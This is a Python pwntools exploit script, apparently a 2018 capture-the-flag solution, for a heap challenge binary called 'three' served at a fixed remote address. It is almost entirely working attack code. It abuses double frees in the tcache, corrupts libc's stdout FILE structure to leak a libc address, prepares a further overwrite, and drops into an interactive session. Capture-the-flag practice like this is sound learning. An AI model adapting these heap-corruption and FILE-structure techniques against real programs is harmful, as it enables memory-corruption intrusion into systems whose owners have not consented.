#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./three"
os.environ["LD_LIBRARY_PATH"]="./"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("39.96.13.122",9999)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def add(con):
    r.sendafter("choice:","1")
    r.sendafter("content:",con)

def dele(idx,delete= False):
    r.sendlineafter("choice:","3")
    r.sendlineafter("idx:",str(idx))
    r.sendlineafter("Clear?(y/n):","y" if delete else "n")

def edit(idx,cont):
    r.sendlineafter("choice:","2")
    r.sendlineafter("idx:",str(idx))
    r.sendafter("content:",cont)


add(p64(0x91)*2+p64(0)+p64(0x91)*5)
add(p64(0x91)*8)
add(p64(0x21)*8)
dele(1,True)
dele(2,True)
dele(0)
dele(0)
edit(0,"\x70")
add("a")
add("a")
for i in range(7):
    dele(2)
dele(2,True)

dele(1,True)
dele(0)
edit(0,"\x70")
add("a"*0x8+p64(0x31)+"\x60\x37")
add("\xa0")
dele(2,True)
add(p64(0xfbad3c80)+p64(0)*3+"\x00")
libc.address = u64(r.recv(16)[8:]) - 0x3b18b0# - 0x3c000

debug()
dele(0,True)
dele(1,True)

add(p64(0xdeadbeef)+ p64(0x61)+p64(0)+p64(libc.sym["_IO_2_1_stdout_"]+0x88-0x30))
debug()
edit(2,p64(0xfbad3c80)+p64(0)*7)

#add("a")
#dele(0)
#edit(0,p64(libc.sym["__malloc_hook"]))
#add("a")




r.interactive()


















